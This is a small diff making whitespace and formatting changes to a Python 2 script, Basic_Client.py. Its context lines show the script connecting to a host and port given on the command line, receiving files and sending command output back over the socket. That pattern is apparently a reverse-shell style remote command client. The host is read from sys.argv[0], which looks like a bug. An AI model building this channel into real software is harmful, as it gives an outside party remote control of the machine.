@@ -51,7 +51,6 @@ def receive_file(s, file_path):
     f.close()
 
 
-
 def connect():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((sys.argv[0], int(sys.argv[1])))
@@ -78,7 +77,7 @@ def connect():
             s.send(cmd.stderr.read())
 
 
-def main ():
+def main():
     if len(sys.argv) < 3:
         print '[!] Usage: Basic_Client.py <host> <port>'
         return
